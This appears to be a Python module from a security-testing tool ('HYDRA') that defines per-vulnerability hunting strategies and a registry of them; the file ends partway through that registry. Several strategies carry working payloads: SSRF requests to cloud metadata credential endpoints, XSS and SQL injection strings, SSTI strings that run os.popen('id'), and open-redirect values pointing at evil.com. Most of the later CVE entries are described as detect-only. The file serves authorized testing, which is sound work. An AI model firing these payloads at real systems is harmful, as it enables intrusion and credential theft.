"""
╔══════════════════════════════════════════════════════════════╗
║  Hunt Strategies — Vuln-Class-Specific Attack Playbooks     ║
║  Each strategy defines tools, payloads, detection logic     ║
╚══════════════════════════════════════════════════════════════╝
"""

import logging
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional

logger = logging.getLogger("hydra.hunt.strategies")


@dataclass
class HuntStrategy:
    """A reusable vuln-class-specific hunting strategy."""
    name: str
    vuln_class: str
    description: str
    tools: List[str]
    nuclei_tags: List[str]
    payloads: List[str] = field(default_factory=list)
    parameter_targets: List[str] = field(default_factory=list)
    paths_to_check: List[str] = field(default_factory=list)
    techniques: List[str] = field(default_factory=list)
    detection_patterns: List[str] = field(default_factory=list)
    severity_range: str = "medium,high,critical"
    priority: int = 1
    max_requests: int = 500
    timeout_per_target: int = 60

    def to_dict(self) -> Dict[str, Any]:
        return {
            "name": self.name, "vuln_class": self.vuln_class,
            "tools": self.tools, "nuclei_tags": self.nuclei_tags,
            "priority": self.priority,
        }


# ═══════════════════════════════════════════
#  Strategy Registry
# ═══════════════════════════════════════════

SSRF_STRATEGY = HuntStrategy(
    name="SSRF Hunter",
    vuln_class="ssrf",
    description="Server-Side Request Forgery — pivot to internal resources",
    tools=["nuclei", "ffuf", "httpx"],
    nuclei_tags=["ssrf", "oast"],
    payloads=[
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://127.0.0.1:80", "http://127.0.0.1:443",
        "http://127.0.0.1:8080", "http://127.0.0.1:8443",
        "http://[::1]:80", "http://0x7f000001",
        "http://0177.0.0.1", "http://2130706433",
        "file:///etc/passwd",
        "gopher://127.0.0.1:25/xHELO",
    ],
    parameter_targets=[
        "url", "uri", "path", "dest", "redirect", "callback",
        "next", "data", "reference", "site", "html", "val",
        "link", "src", "img", "feed", "to", "out", "view",
        "page", "open", "domain", "return", "port", "file",
    ],
    detection_patterns=[
        "root:x:", "ami-id", "instance-id", "computeMetadata",
        "AccessDenied", "NoSuchBucket", "Connection refused",
    ],
    priority=0,
    max_requests=300,
)

IDOR_STRATEGY = HuntStrategy(
    name="IDOR Hunter",
    vuln_class="idor",
    description="Insecure Direct Object Reference — access unauthorized resources",
    tools=["nuclei", "httpx"],
    nuclei_tags=["idor", "access-control"],
    techniques=[
        "sequential_id_increment",   # /user/1 → /user/2
        "uuid_prediction",           # predictable UUIDs
        "parameter_swap",            # userA token + userB id
        "http_method_change",        # GET→PUT/PATCH/DELETE
        "path_traversal",            # /api/user/../../admin
        "graphql_batching",          # batch multiple IDs
    ],
    parameter_targets=[
        "id", "uid", "user_id", "account_id", "profile_id",
        "order_id", "doc_id", "file_id", "invoice_id", "report_id",
        "msg_id", "thread_id", "comment_id", "post_id",
    ],
    detection_patterns=[
        "unauthorized", "forbidden", "different user data",
        "email", "phone", "address",
    ],
    priority=0,
)

XSS_STRATEGY = HuntStrategy(
    name="XSS Hunter",
    vuln_class="xss",
    description="Cross-Site Scripting — inject client-side scripts",
    tools=["nuclei", "katana", "dalfox"],
    nuclei_tags=["xss"],
    payloads=[
        "<script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
        "javascript:alert(1)",
        "'-alert(1)-'",
        "<svg/onload=alert(1)>",
        "{{constructor.constructor('alert(1)')()}}",
        "${alert(1)}",
        "<details open ontoggle=alert(1)>",
        '"><iframe srcdoc="<script>alert(1)</script>">',
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(alert(1))//",
    ],
    parameter_targets=[
        "q", "search", "query", "s", "keyword", "term",
        "name", "title", "content", "body", "message",
        "comment", "text", "value", "input", "desc",
        "redirect", "url", "next", "callback", "return",
    ],
    detection_patterns=["<script", "onerror", "alert(", "javascript:"],
    priority=1,
)

SQLI_STRATEGY = HuntStrategy(
    name="SQLi Hunter",
    vuln_class="sqli",
    description="SQL Injection — extract or manipulate database",
    tools=["nuclei", "sqlmap"],
    nuclei_tags=["sqli", "sql-injection"],
    payloads=[
        "'", "\"", "' OR '1'='1", "' OR 1=1--",
        "1 UNION SELECT NULL--", "1' AND '1'='1",
        "' WAITFOR DELAY '0:0:5'--",
        "1; SELECT SLEEP(5);--",
        "') OR ('1'='1",
        "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
    ],
    parameter_targets=[
        "id", "uid", "user", "name", "page", "search",
        "query", "cat", "dir", "action", "board", "date",
        "detail", "file", "download", "path", "folder",
        "prefix", "include", "inc", "locate", "show",
        "doc", "site", "type", "view", "content", "sort",
        "order", "field", "table", "from", "sel", "where",
    ],
    detection_patterns=[
        "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL",
        "SQLITE_ERROR", "unterminated", "syntax error",
        "ODBC", "unclosed quotation",
    ],
    priority=1,
)

OAUTH_STRATEGY = HuntStrategy(
    name="OAuth/Auth Flow Hunter",
    vuln_class="oauth",
    description="OAuth misconfiguration and authentication bypass",
    tools=["nuclei", "httpx"],
    nuclei_tags=["oauth", "token", "jwt", "auth"],
    techniques=[
        "token_in_referer",          # leak via Referer header
        "state_param_missing",       # CSRF via OAuth
        "redirect_uri_bypass",       # open redirect in OAuth
        "scope_escalation",          # request higher scopes
        "pkce_absence",              # missing PKCE in public clients
        "implicit_flow_abuse",       # token in URL fragment
        "jwt_none_algo",             # alg=none bypass
        "jwt_key_confusion",         # RS256 → HS256 confusion
        "token_reuse",               # replay access tokens
        "refresh_token_rotation",    # missing rotation
    ],
    parameter_targets=[
        "redirect_uri", "client_id", "response_type", "scope",
        "state", "code", "token", "id_token", "nonce",
    ],
    detection_patterns=[
        "invalid_grant", "access_denied", "unauthorized_client",
        "invalid_scope", "token", "bearer",
    ],
    priority=0,
)

AUTHZ_STRATEGY = HuntStrategy(
    name="Authorization Bypass Hunter",
    vuln_class="authz",
    description="Broken access control — horizontal and vertical escalation",
    tools=["nuclei", "httpx"],
    nuclei_tags=["auth-bypass", "default-login", "misconfig"],
    techniques=[
        "path_manipulation",         # /admin → /Admin → /%61dmin
        "method_override",           # X-HTTP-Method-Override: PUT
        "header_injection",          # X-Original-URL, X-Forwarded-For
        "role_param_tampering",      # role=user → role=admin
        "missing_function_check",    # direct access to admin functions
        "forced_browsing",           # guess admin panel paths
        "verb_tampering",            # GET→POST→PUT→DELETE
        "api_version_rollback",      # /v2/ → /v1/ (less restrictions)
    ],
    paths_to_check=[
        "/admin", "/admin/", "/administrator", "/management",
        "/api/admin", "/internal", "/debug", "/console",
        "/portal", "/dashboard", "/manager", "/control",
        "/system", "/config", "/settings", "/users",
    ],
    priority=0,
)

SSTI_STRATEGY = HuntStrategy(
    name="SSTI Hunter",
    vuln_class="ssti",
    description="Server-Side Template Injection — potential RCE via templates",
    tools=["nuclei"],
    nuclei_tags=["ssti"],
    payloads=[
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
        "{7*7}", "{{config}}", "{{self}}", "${class.forName('java.lang.Runtime')}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "a]}}{{7*7}}", "{{dump(app)}}",
    ],
    parameter_targets=[
        "template", "page", "name", "title", "content",
        "message", "greeting", "email", "subject", "desc",
    ],
    detection_patterns=["49", "7777777", "config", "subclasses"],
    priority=1,
)

CORS_STRATEGY = HuntStrategy(
    name="CORS Misconfiguration Hunter",
    vuln_class="cors",
    description="Cross-Origin Resource Sharing misconfiguration",
    tools=["nuclei", "httpx"],
    nuclei_tags=["cors", "misconfiguration"],
    techniques=[
        "null_origin",               # Origin: null
        "wildcard_origin",           # Access-Control-Allow-Origin: *
        "subdomain_reflection",      # evil.target.com reflected
        "prefix_match",              # target.com.evil.com accepted
        "postfix_match",             # eviltarget.com accepted
        "credential_leakage",        # with credentials allowed
    ],
    detection_patterns=[
        "Access-Control-Allow-Origin",
        "Access-Control-Allow-Credentials: true",
    ],
    priority=2,
)

OPEN_REDIRECT_STRATEGY = HuntStrategy(
    name="Open Redirect Hunter",
    vuln_class="open_redirect",
    description="Unvalidated redirects for phishing or OAuth bypass",
    tools=["nuclei"],
    nuclei_tags=["redirect"],
    payloads=[
        "//evil.com", "https://evil.com", "/\\evil.com",
        "//evil%00.com", "https:evil.com", "////evil.com",
        "/\t/evil.com", "/.evil.com", "///\\;@evil.com",
        "https://evil.com%23.target.com",
        "https://evil.com%2523.target.com",
        "javascript:alert(document.domain)//",
        "data:text/html,<script>alert(1)</script>",
    ],
    parameter_targets=[
        "url", "redirect", "next", "dest", "redir", "return",
        "returnTo", "go", "checkout_url", "continue", "return_path",
        "forward", "ref", "target", "out", "view", "login",
        "logout", "image_url", "callback",
    ],
    detection_patterns=["evil.com", "Location:", "301", "302"],
    priority=2,
)

RACE_CONDITION_STRATEGY = HuntStrategy(
    name="Race Condition Hunter",
    vuln_class="race_condition",
    description="Time-of-check to time-of-use and concurrency bugs",
    tools=["nuclei", "httpx"],
    nuclei_tags=["race-condition"],
    techniques=[
        "parallel_discount_redeem",  # redeem coupon N times
        "parallel_transfer",         # double-spend money
        "parallel_vote",             # vote multiple times
        "parallel_follow",           # follow/like multiple times
        "parallel_signup",           # bypass invite limits
        "parallel_file_upload",      # race on file processing
    ],
    priority=1,
)

INFO_DISCLOSURE_STRATEGY = HuntStrategy(
    name="Information Disclosure Hunter",
    vuln_class="info_disclosure",
    description="Exposed sensitive data, debug endpoints, config files",
    tools=["nuclei", "ffuf", "dirsearch"],
    nuclei_tags=["exposure", "disclosure", "config", "backup"],
    paths_to_check=[
        "/.env", "/.git/config", "/.git/HEAD",
        "/.svn/entries", "/.DS_Store", "/.htaccess",
        "/debug", "/debug/vars", "/debug/pprof",
        "/actuator", "/actuator/env", "/actuator/health",
        "/graphql", "/graphiql", "/__graphql",
        "/server-status", "/server-info", "/phpinfo.php",
        "/elmah.axd", "/trace.axd",
        "/wp-json/wp/v2/users", "/wp-config.php.bak",
        "/api/swagger.json", "/api/swagger.yaml", "/openapi.json",
        "/swagger-ui/", "/redoc",
        "/backup.sql", "/database.sql", "/dump.sql",
        "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
        "/.well-known/security.txt", "/.well-known/openid-configuration",
        "/package.json", "/composer.json", "/Gemfile",
        "/web.config", "/config.yml", "/config.json",
        "/error.log", "/access.log", "/debug.log",
        "/console", "/admin/logs", "/api/logs",
    ],
    detection_patterns=[
        "DB_PASSWORD", "SECRET_KEY", "API_KEY",
        "BEGIN RSA PRIVATE", "password", "credentials",
        "phpinfo()", "DOCUMENT_ROOT", "SERVER_ADDR",
    ],
    priority=1,
)

BUSINESS_LOGIC_STRATEGY = HuntStrategy(
    name="Business Logic Hunter",
    vuln_class="business_logic",
    description="Application logic flaws not detectable by scanners",
    tools=["httpx"],
    nuclei_tags=[],
    techniques=[
        "negative_quantity",         # order -1 items
        "price_manipulation",        # change price in request
        "currency_rounding",         # rounding errors
        "workflow_skip",             # skip verification step
        "feature_abuse",             # abuse intended features
        "rate_limit_bypass",         # circumvent rate limits
        "time_manipulation",         # expire/future timestamps
        "privilege_chain",           # chain low-priv actions
    ],
    priority=2,
)

NEXTJS_STRATEGY = HuntStrategy(
    name="Next.js Hunter",
    vuln_class="nextjs",
    description=("Next.js-specific weaknesses incl. middleware auth bypass "
                 "(CVE-2025-29927), plus build/source recon surface"),
    tools=["nuclei", "httpx"],
    nuclei_tags=["nextjs"],
    # No benign param probe: the middleware bypass is a REQUEST-HEADER
    # differential, confirmed depth-first in ConfirmationEngine (never in the
    # autonomous send path). The breadth pass only fingerprints Next.js here.
    parameter_targets=[],
    paths_to_check=[
        "/_next/static/", "/_next/data/",
        "/__nextjs_original-stack-frame",
        "/500", "/404",
    ],
    techniques=[
        "middleware_subrequest_bypass (CVE-2025-29927)",
        "source_map_disclosure",
        "__NEXT_DATA__ recon",
    ],
    detection_patterns=[
        "__NEXT_DATA__", "/_next/static", "_buildManifest", "next/dist",
    ],
    priority=1,
)


SAP_NETWEAVER_STRATEGY = HuntStrategy(
    name="SAP NetWeaver Hunter",
    vuln_class="sap",
    description=("SAP NetWeaver Visual Composer weaknesses incl. the pre-auth "
                 "Metadata Uploader exposure (CVE-2025-31324, CISA KEV)"),
    tools=["nuclei", "httpx"],
    nuclei_tags=["sap", "netweaver", "cve2025", "rce", "kev"],
    # No benign param probe and NO upload primitive: CVE-2025-31324 is a
    # pre-auth REACHABILITY differential on a fixed endpoint, confirmed
    # depth-first in ConfirmationEngine. The breadth pass only fingerprints
    # NetWeaver and checks the endpoint's existence with a benign GET — the
    # multipart POST webshell upload (the exploit) is NEVER sent, and the
    # CVE-2025-42999 deserialization sink stays detection-only.
    parameter_targets=[],
    paths_to_check=[
        "/developmentserver/metadatauploader",
        "/developmentserver/",
        "/irj/portal", "/nwa", "/sap/public/info",
    ],
    techniques=[
        "metadata_uploader_preauth_reachability (CVE-2025-31324)",
        "netweaver_fingerprint",
    ],
    detection_patterns=[
        "metadatauploader", "SAP NetWeaver", "Visual Composer", "com.sap",
        "/irj/",
    ],
    severity_range="high,critical",
    priority=0,
)


ASTRO_STRATEGY = HuntStrategy(
    name="Astro Hunter",
    vuln_class="astro",
    description=("Astro on-demand middleware forwarded-origin trust — a "
                 "host/proto gate bypass via spoofed X-Forwarded-* headers "
                 "(CVE-2025-64525)"),
    tools=["nuclei", "httpx"],
    nuclei_tags=["astro", "cve2025", "misconfig"],
    # No benign param probe: the bypass is a REQUEST-HEADER access-control status
    # differential, confirmed depth-first in ConfirmationEngine (never in the
    # autonomous send path). The breadth pass only fingerprints Astro here.
    # HYDRA spoofs the forwarded origin ONLY to an empty value / the target's own
    # host — never a foreign host a shared cache could replay.
    parameter_targets=[],
    paths_to_check=[
        "/_astro/", "/_actions/",
    ],
    techniques=[
        "forwarded_origin_middleware_bypass (CVE-2025-64525)",
        "astro_fingerprint",
    ],
    detection_patterns=[
        "/_astro/", "astro-island", "data-astro-cid", "Astro.",
    ],
    severity_range="medium,high",
    priority=1,
)


NEXTJS_SSRF_STRATEGY = HuntStrategy(
    name="Next.js Header-Reflection Hunter",
    vuln_class="nextjs_ssrf",
    description=("Next.js NextResponse.next({request:{headers}}) reflecting "
                 "attacker request headers — the header-reflection SSRF "
                 "precondition (CVE-2025-57822)"),
    tools=["nuclei", "httpx"],
    nuclei_tags=["nextjs", "cve2025", "ssrf"],
    # No benign param probe: this is a REQUEST-HEADER reflection differential,
    # confirmed depth-first in ConfirmationEngine as a LEAD only. Reflection is
    # the SSRF precondition — the actual SSRF proof is the operator-owned OOB
    # callback path (--confirm-class ssrf --oob-callback), never an internal or
    # metadata fetch. Nothing is auto-sent by the breadth pass.
    parameter_targets=[],
    paths_to_check=[
        "/_next/static/", "/_next/data/",
    ],
    techniques=[
        "request_header_reflection (CVE-2025-57822)",
        "ssrf_precondition",
    ],
    detection_patterns=[
        "__NEXT_DATA__", "/_next/static", "next/dist",
    ],
    severity_range="medium,high",
    priority=1,
)


VITE_STRATEGY = HuntStrategy(
    name="Vite Dev-Server Hunter",
    vuln_class="vite",
    description=("Exposed Vite dev server with a server.fs.deny bypass — a "
                 "trailing-separator query trick (?raw?? / ?import&raw??) skips "
                 "the deny filter and reaches the file loader (CVE-2025-30208)"),
    tools=["nuclei", "httpx"],
    nuclei_tags=["vite", "exposure", "misconfig", "cve2025"],
    # No benign param probe and NO traversal payload: the bypass is proven as a
    # STATUS differential on a guaranteed-NONEXISTENT nonce'd canary, confirmed
    # depth-first in ConfirmationEngine (never in the autonomous send path). The
    # breadth pass only fingerprints the dev server — it NEVER reads a file, and
    # uses no ../ traversal, file://, or /@fs/ path.
    parameter_targets=[],
    paths_to_check=[
        "/@vite/client", "/@id/", "/__vite_ping", "/vite.config.js",
        "/node_modules/.vite/",
    ],
    techniques=[
        "server_fs_deny_bypass (CVE-2025-30208)",
        "vite_dev_server_fingerprint",
    ],
    detection_patterns=[
        "@vite/client", "vite/dist", "__vite_ping", "/@react-refresh",
    ],
    severity_range="high,critical",
    priority=0,
)


WEB_CACHE_STRATEGY = HuntStrategy(
    name="Web Cache Key-Confusion Hunter",
    vuln_class="web_cache",
    description=("Next.js Image Optimization cache-key confusion — the optimizer "
                 "negotiates the output format from the Accept header but omits it "
                 "from the cache key, so a response for one Accept is served to a "
                 "client with a different Accept (a cache-poisoning precondition, "
                 "CVE-2025-57752)"),
    tools=["nuclei", "httpx"],
    nuclei_tags=["nextjs", "cache", "misconfig", "cve2025"],
    # No benign param probe and NO poisoning payload: the mis-keying is proven as
    # a two-GET cache-STATE differential on a UNIQUE operator-nonce'd key (isolated
    # so no real user shares it), confirmed depth-first in ConfirmationEngine
    # (never in the autonomous send path). The breadth pass only fingerprints the
    # /_next/image optimizer — it never poisons a shared cache entry.
    parameter_targets=[],
    paths_to_check=[
        "/_next/image", "/_next/image?url=%2F&w=640&q=75",
    ],
    techniques=[
        "image_optimizer_cache_key_confusion (CVE-2025-57752)",
        "nextjs_image_optimizer_fingerprint",
    ],
    detection_patterns=[
        "x-nextjs-cache", "x-vercel-cache", "/_next/image",
    ],
    severity_range="medium,high",
    priority=1,
)


# ═══════════════════════════════════════════
#  Strategy Registry
# ═══════════════════════════════════════════

REACT_ROUTER_STRATEGY = HuntStrategy(
    name="React Router / Remix Prerender-Data Hunter",
    vuln_class="react_router",
    description=("React Router v7 / Remix prerender-data spoofing — the server "
                 "trusts a client-supplied X-React-Router-Prerender-Data header "
                 "and serialises its route data into the server-rendered HTML "
                 "(CVE-2025-43865), a spoofing / XSS / cache-poisoning precondition"),
    tools=["nuclei", "httpx"],
    nuclei_tags=["react-router", "remix", "misconfig", "cve2025"],
    # No benign param probe and NO executable payload: the spoofing channel is
    # proven as a body-REFLECTION differential on a UNIQUE pure-alnum operator
    # marker (no HTML metachar → never XSS), confirmed depth-first in
    # ConfirmationEngine (never in the autonomous send path). The breadth pass
    # only fingerprints the framework — it never injects an executable value.
    parameter_targets=[],
    paths_to_check=[
        "/", "/assets/", "/__manifest",
    ],
    techniques=[
        "prerender_data_spoofing (CVE-2025-43865)",
        "react_router_remix_fingerprint",
    ],
    detection_patterns=[
        "__reactRouterContext", "__remixContext", "window.__reactRouterManifest",
    ],
    severity_range="medium,high",
    priority=1,
)


K8S_ADMISSION_STRATEGY = HuntStrategy(
    name="ingress-nginx Admission-Controller Exposure Hunter",
    vuln_class="k8s_admission",
    description=("ingress-nginx admission-controller (default :8443) exposed "
                 "outside the cluster without client-cert mTLS — the external "
                 "reachability precondition for CVE-2025-1974 (IngressNightmare), "
                 "whose RCE is triggered by an AdmissionReview POST carrying a "
                 "crafted Ingress object"),
    tools=["nuclei", "httpx", "nmap"],
    nuclei_tags=["kubernetes", "ingress-nginx", "exposure", "cve2025"],
    # Reachability / POSTURE only. The confirm step is GET-only: /healthz +
    # the admission webhook path fingerprint, presenting NO client certificate.
    # HYDRA never sends the AdmissionReview POST (that POST IS the RCE), so
    # there is NO benign param probe and NO executable payload — the breadth
    # pass only fingerprints exposure; confirmation caps at OBSERVED.
    parameter_targets=[],
    paths_to_check=[
        "/healthz", "/networking/v1/ingresses",
    ],
    techniques=[
        "admission_controller_exposure (CVE-2025-1974)",
        "clientcertless_reachability_differential",
    ],
    detection_patterns=[
        "AdmissionReview", "ingress-nginx", "expected application/json",
    ],
    severity_range="high",
    priority=0,
)


# --- Static-JS cluster (P19-P22): detect-only client-side confirmers. Each
# GETs the target's OWN HTML + its <script src> bundles (scope-gated) and
# matches a version fingerprint + a known-vulnerable static source signature,
# or reads the CSP the target sends. EMPTY parameter_targets: nothing is
# auto-sent; the XSS/PP/clobbering payoff stays detect-only (confirm caps at
# OBSERVED), and HYDRA never builds/sends a payload or triggers a sink. ---
SANITIZER_BYPASS_STRATEGY = HuntStrategy(
    name="DOMPurify Prototype-Pollution Build Detector",
    vuln_class="sanitizer_bypass",
    description=("DOMPurify [3.0.1, 4.0.0) served with the vulnerable "
                 "CUSTOM_ELEMENT_HANDLING '|| {}' fallback — the prototype-"
                 "pollution → mutation-XSS precondition (CVE-2026-41238). "
                 "Static library scan; the payoff stays detect-only"),
    tools=["httpx", "katana"],
    nuclei_tags=["dompurify", "xss", "prototype-pollution", "cve2026"],
    parameter_targets=[],
    paths_to_check=[],
    techniques=["static_library_version_fingerprint",
                "custom_element_handling_fallback_signature"],
    detection_patterns=["DOMPurify", "CUSTOM_ELEMENT_HANDLING"],
    severity_range="high",
    priority=1,
)


POSTMESSAGE_STRATEGY = HuntStrategy(
    name="Missing-Origin postMessage Handler Detector",
    vuln_class="postmessage",
    description=("Served JS registers a cross-document 'message' listener with "
                 "no origin validation that reaches an innerHTML-family sink — "
                 "the DOM postMessage-XSS precondition (cf. WooCommerce "
                 "CVE-2025-5062). Static source scan; HYDRA never posts a "
                 "message or triggers the sink"),
    tools=["httpx", "katana"],
    nuclei_tags=["postmessage", "dom-xss", "cve2025"],
    parameter_targets=[],
    paths_to_check=[],
    techniques=["message_listener_without_origin_check",
                "html_sink_proximity_signature"],
    detection_patterns=["addEventListener('message'", "innerHTML"],
    severity_range="medium,high",
    priority=1,
)


DOM_CLOBBERING_STRATEGY = HuntStrategy(
    name="Bootstrap 3 DOM-Clobbering Sanitizer Detector",
    vuln_class="dom_clobbering",
    description=("Bootstrap 3 [3.4.1, 4.0.0) served with the clobbering-prone "
                 "tooltip/popover createHTMLDocument/sanitizeHtml sanitizer "
                 "(CVE-2025-1647). Static library scan; HYDRA never injects a "
                 "clobbering element"),
    tools=["httpx", "katana"],
    nuclei_tags=["bootstrap", "dom-clobbering", "xss", "cve2025"],
    parameter_targets=[],
    paths_to_check=[],
    techniques=["static_library_version_fingerprint",
                "createhtmldocument_sanitizer_signature"],
    detection_patterns=["Bootstrap v3", "createHTMLDocument", "sanitizeHtml"],
    severity_range="low",
    priority=2,
)


CSP_STRATEGY = HuntStrategy(
    name="Nonce-Based CSP Bypass-Precondition Detector",
    vuln_class="csp",
    description=("Passive posture: reads the Content-Security-Policy the target "
                 "sends (header + <meta>) across two GETs and flags nonce-bypass "
                 "preconditions — meta-delivery, nonce reuse, or unsafe-inline "
                 "alongside a nonce. Sends nothing but two plain GETs"),
    tools=["httpx"],
    nuclei_tags=["csp", "misconfig", "headers"],
    parameter_targets=[],
    paths_to_check=[],
    techniques=["csp_header_and_meta_parse", "nonce_reuse_differential"],
    detection_patterns=["Content-Security-Policy", "nonce-"],
    severity_range="low",
    priority=2,
)


# --- Secret-overshare cluster (P2/P5): detect-only info-disclosure confirmers.
# Each GETs the target's OWN authorized management/API endpoint (unauth for
# RabbitMQ; the operator's OWN in-scope token for OneLogin), detects that a
# sensitive secret KEY is PRESENT in the JSON, and REDACTS its value — reporting
# only key-presence + length + a salted non-reversible fingerprint. EMPTY
# parameter_targets: nothing is auto-fuzzed. HYDRA never reads/echoes/stores/
# exfiltrates the secret VALUE and never uses a leaked secret to authenticate or
# pivot; confirmation caps at REPRODUCED on a stable repeat GET, never higher. ---
RABBITMQ_OAUTH_STRATEGY = HuntStrategy(
    name="RabbitMQ Management OAuth client_secret Over-Share Detector",
    vuln_class="rabbitmq_oauth",
    description=("Unauthenticated GET of the RabbitMQ management plugin's OAuth "
                 "config (CVE-2026-5721) that returns oauth_client_secret / "
                 "client_secret to anonymous callers. HYDRA flags that the "
                 "secret KEY is present and redacts the value — it never reads, "
                 "echoes, or reuses the secret itself"),
    tools=["httpx"],
    nuclei_tags=["rabbitmq", "exposure", "misconfig", "cve2026"],
    parameter_targets=[],
    paths_to_check=["/api/auth", "/api/definitions"],
    techniques=[
        "unauth_management_endpoint_get (CVE-2026-5721)",
        "secret_key_presence_detection_value_redacted",
    ],
    detection_patterns=["oauth_client_secret", "client_secret"],
    severity_range="high",
    priority=1,
)


ONELOGIN_OIDC_STRATEGY = HuntStrategy(
    name="OneLogin OIDC App client_secret Over-Return Detector",
    vuln_class="onelogin_oidc",
    description=("Authenticated GET of the OneLogin apps API (CVE-2025-59363, "
                 "/api/2/apps) that over-returns each app's client_secret / "
                 "api_key to any valid-token caller. HYDRA uses the operator's "
                 "OWN in-scope token, flags that the secret KEY is present, and "
                 "redacts the value — it never reads, echoes, or pivots with it"),
    tools=["httpx"],
    nuclei_tags=["onelogin", "oidc", "exposure", "cve2025"],
    parameter_targets=[],
    paths_to_check=["/api/2/apps", "/api/1/apps"],
    techniques=[
        "authed_api_overshare_get (CVE-2025-59363)",
        "secret_key_presence_detection_value_redacted",
    ],
    detection_patterns=["client_secret", "api_key"],
    severity_range="high",
    priority=1,
)


# CVE-2024-4577 — PHP-CGI "WorstFit" Best-Fit charset ARGUMENT injection. On
# Windows, php-cgi.exe is reached through a path that applies the active locale's
# Best-Fit character mapping to the raw query string AFTER the web server quotes
# it, so a benign Unicode look-alike (U+00AD SOFT HYPHEN, sent as the single
# percent-octet "%AD") folds to an ASCII "-" and a query of "?%ADv" arrives as
# the php-cgi command-line flag "-v". HYDRA proves ONLY that the look-alike is
# mapped onto a CLI flag, using the single READ-ONLY -v/-V (print version) flag:
# a differential where a plain control request shows no PHP version banner but
# "?%ADv" surfaces one proves the argument-injection CHANNEL. EMPTY
# parameter_targets: nothing is auto-fuzzed, and the check is route-based. HYDRA
# NEVER injects -d (the allow_url_include / auto_prepend_file=php://input RCE
# directive), -s (source disclosure), -r/-f (run code/a file) or -i (phpinfo),
# and NEVER sends the php://input POST body that completes the RCE chain.
BEST_FIT_CHARSET_STRATEGY = HuntStrategy(
    name="PHP-CGI Best-Fit (WorstFit) Argument-Injection Precondition Detector",
    vuln_class="best_fit_charset",
    description=("Windows PHP-CGI Best-Fit charset argument-injection "
                 "precondition (CVE-2024-4577 / WorstFit): a benign U+00AD "
                 "look-alike ('%AD') folds to '-' and injects the READ-ONLY "
                 "'-v'/'-V' version flag onto the php-cgi command line. HYDRA "
                 "flags only the injection CHANNEL via a version-banner "
                 "differential — it never runs code, never injects -d/-s/-r/-f/"
                 "-i, and never sends the php://input RCE body"),
    tools=["httpx"],
    nuclei_tags=["php", "php-cgi", "rce", "cve2024", "cve-2024-4577"],
    parameter_targets=[],
    paths_to_check=["/index.php", "/php-cgi/php-cgi.exe",
                    "/cgi-bin/php-cgi.exe", "/cgi-bin/php.exe"],
    techniques=[
        "bestfit_charset_lookalike_arg_injection (CVE-2024-4577)",
        "readonly_version_flag_banner_differential",
    ],
    detection_patterns=["PHP ", "Zend Engine", "(cgi-fcgi)",
                        "Copyright (c) The PHP Group"],
    severity_range="high",
    priority=1,
)


# CVE-2025-24813 (Apache Tomcat partial-PUT RCE / session-deserialization).
# HYDRA detects only the RCE *precondition* — a Tomcat default servlet that
# ADVERTISES a write method (PUT) — via a bodyless, non-mutating OPTIONS probe
# that reads the capability-advertising ``Allow`` response header. A PUT in the
# advertised set means writes may be enabled (`readonly=false`), the structural
# precondition for the partial-PUT upload + crafted-session-file deserialization
# chain. This is an INDICATOR, not proof: some servers advertise PUT yet reject
# the write. HYDRA NEVER sends PUT/DELETE/PATCH, never uploads a partial-PUT
# ``.jsp``/session file, and never ships the deserialization gadget — the
# dangerous verb is observed as *advertised*, never *exercised*. The Tomcat/
# Coyote ``Server`` banner is a non-essential fingerprint annotation only.
DANGEROUS_HTTP_METHODS_STRATEGY = HuntStrategy(
    name="Tomcat Partial-PUT Precondition (Dangerous HTTP Methods) Detector",
    vuln_class="dangerous_http_methods",
    description=("Apache Tomcat partial-PUT RCE precondition "
                 "(CVE-2025-24813): a bodyless, non-mutating OPTIONS probe "
                 "reads the capability-advertising 'Allow' header and flags a "
                 "write method (PUT) advertised on a default-servlet path as "
                 "the structural PRECONDITION for the partial-PUT + "
                 "session-deserialization chain. HYDRA flags only the "
                 "advertised capability — it never sends PUT/DELETE/PATCH, "
                 "never uploads a partial-PUT file, and never ships the "
                 "deserialization gadget"),
    tools=["httpx"],
    nuclei_tags=["tomcat", "apache", "rce", "cve2025", "cve-2025-24813",
                 "http-methods"],
    parameter_targets=[],
    paths_to_check=["/", "/manager/", "/examples/", "/host-manager/"],
    techniques=[
        "options_allow_header_capability_differential (CVE-2025-24813)",
        "advertised_write_method_precondition",
        "tomcat_coyote_server_banner_annotation",
    ],
    detection_patterns=["Allow", "PUT", "Tomcat", "Coyote", "Apache-Coyote"],
    severity_range="medium",
    priority=1,
)


STRATEGY_REGISTRY: Dict[str, HuntStrategy] = {
    "ssrf": SSRF_STRATEGY,
    "idor": IDOR_STRATEGY,
    "xss": XSS_STRATEGY,
    "sqli": SQLI_STRATEGY,
    "oauth": OAUTH_STRATEGY,
    "authz": AUTHZ_STRATEGY,
    "ssti": SSTI_STRATEGY,
    "cors": CORS_STRATEGY,
    "open_redirect": OPEN_REDIRECT_STRATEGY,
    "race_condition": RACE_CONDITION_STRATEGY,
    "info_disclosure": INFO_DISCLOSURE_STRATEGY,
    "business_logic": BUSINESS_LOGIC_STRATEGY,
    "nextjs": NEXTJS_STRATEGY,
    "sap": SAP_NETWEAVER_STRATEGY,
    "astro": ASTRO_STRATEGY,
    "nextjs_ssrf": NEXTJS_SSRF_STRATEGY,
    "vite": VITE_STRATEGY,
    "web_cache": WEB_CACHE_STRATEGY,
    "react_router": REACT_ROUTER_STRATEGY,
    "k8s_admission": K8S_ADMISSION_STRATEGY,
    "exposed_service": K8S_ADMISSION_STRATEGY,
    "sanitizer_bypass": SANITIZER_BYPASS_STRATEGY,
    "postmessage": POSTMESSAGE_STRATEGY,
    "dom_clobbering": DOM_CLOBBERING_STRATEGY,
    "csp": CSP_STRATEGY,
    "rabbitmq_oauth": RABBITMQ_OAUTH_STRATEGY,
    "rabbitmq": RABBITMQ_OAUTH_STRATEGY,
